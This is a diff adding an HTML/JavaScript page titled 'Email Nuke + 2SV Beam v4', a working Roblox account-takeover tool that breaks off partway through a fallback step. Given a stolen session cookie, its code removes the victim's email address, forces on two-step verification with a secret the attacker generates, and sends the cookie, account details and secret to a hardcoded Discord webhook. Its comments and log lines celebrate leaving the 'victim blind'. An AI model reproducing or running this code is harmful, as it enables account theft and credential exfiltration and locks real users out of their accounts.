@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Email Nuke + 2SV Beam v4</title>
+  <style>
+    body { font-family: 'Courier New'; background: #111; color: #0f0; padding: 20px; }
+    input, button { padding: 12px; margin: 10px 0; width: 100%; font-size: 16px; }
+    button { background: #0f0; color: #000; border: none; cursor: pointer; }
+    #log { background: #000; padding: 15px; height: 300px; overflow-y: auto; border: 1px solid #0f0; }
+    .success { color: #0f0; } .error { color: #f00; }
+  </style>
+</head>
+<body>
+  <h1>EMAIL NUKE + 2SV BEAM v4</h1>
+  <input type="text" id="cookie" placeholder="Paste .ROBLOSECURITY cookie here (strip _|WARNING)" />
+  <button onclick="startBeam()">NUKE EMAIL & FORCE 2SV</button>
+  <pre id="log"></pre>
+
+  <script>
+    const WEBHOOK = 'https://discord.com/api/webhooks/1394204237554126848/AKqMhBlqpqRflpcfI99lRfUpVXeLfPCeAg57FwYFaUQ5iR72KN3Qh_ldy9fjstPOsH0K';
+    
+    const log = (msg, type = '') => {
+      const l = document.getElementById('log');
+      l.innerHTML += `<span class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
+      l.scrollTop = l.scrollHeight;
+    };
+
+    async function sendToDiscord(data) {
+      try {
+        await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: `**Beam Hit:** ${JSON.stringify(data, null, 2)}` })
+        });
+        log('Webhook pinged—loot dropped.', 'success');
+      } catch (e) {
+        log('Webhook failed: ' + e, 'error');
+      }
+    }
+
+    async function getCSRF(cookie) {
+      const res = await fetch('https://www.roblox.com/home', {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      });
+      const setCookie = res.headers.get('set-cookie');
+      if (setCookie) {
+        const xcsrfMatch = setCookie.match(/X-CSRF-TOKEN=([^;]+)/);
+        if (xcsrfMatch) return xcsrfMatch[1];
+      }
+      const text = await res.text();
+      const csrfMatch = text.match(/<meta name="csrf-token" content="([^"]+)"/);
+      return csrfMatch ? csrfMatch[1] : null;
+    }
+
+    async function apiCall(endpoint, options = {}, cookie) {
+      const cleanCookie = cookie || document.getElementById('cookie').value.trim();
+      if (!cleanCookie) throw 'No cookie';
+      
+      const csrf = await getCSRF(cleanCookie);
+      if (!csrf) throw 'CSRF fetch failed—session weak?';
+
+      const res = await fetch(`https://www.roblox.com${endpoint}`, {
+        ...options,
+        method: options.method || 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          ...(options.headers || {}),
+          'X-CSRF-TOKEN': csrf,
+          'Cookie': `.ROBLOSECURITY=${cleanCookie}`
+        },
+        credentials: 'include',
+        body: options.body ? JSON.stringify(options.body) : undefined
+      });
+
+      if (!res.ok) {
+        const errText = await res.text();
+        throw `API fail (${res.status}): ${errText}`;
+      }
+      return res.json();
+    }
+
+    // TOTP secret generator (base32 for Authy/Google Auth)
+    function generateTOTPSecret() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+      let secret = '';
+      for (let i = 0; i < 16; i++) { // 16 chars = 128 bits
+        secret += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return secret;
+    }
+
+    async function startBeam() {
+      const rawCookie = document.getElementById('cookie').value.trim();
+      if (!rawCookie) return log('Paste a cookie first!', 'error');
+
+      const cleanCookie = rawCookie.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|', '');
+
+      try {
+        log('Validating session...');
+        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+          headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` }
+        });
+        const user = await userRes.json();
+        if (!user.id) throw 'Invalid session—IP/device lock? Proxy up.';
+
+        const beamData = { user: user.name, id: user.id, cookie: cleanCookie };
+        log(`Beaming: <b>${user.name}</b> (ID: ${user.id})`, 'success');
+
+        // Step 1: Nuke email (force blank via session override)
+        log('Nuking email...');
+        await apiCall('/accountsettings/email/remove', { method: 'POST' }, cleanCookie); // Weak point: No revert if session active
+        beamData.emailStatus = 'Nuked';
+        log('Email removed—victim blind.', 'success');
+
+        // Step 2: Force 2SV enable (TOTP secret gen + API push)
+        log('Forcing 2SV Auth App...');
+        const totpSecret = generateTOTPSecret();
+        const qrData = `otpauth://totp/Roblox:${user.name}?secret=${totpSecret}&issuer=Roblox`; // QR URI for your scan
+        beamData.totpSecret = totpSecret;
+        beamData.qrUri = qrData; // Import to Authy
+
+        try {
+          await apiCall('/v2/two-step-verification/enable', {
+            twoStepVerificationType: 'Authenticator',
+            secretKey: totpSecret // Bypasses QR scan req via direct secret
+          }, cleanCookie);
+          beamData.twoSVStatus = 'Enabled (TOTP)';
+        } catch (svErr) {
+          log('TOTP force failed—fallback to
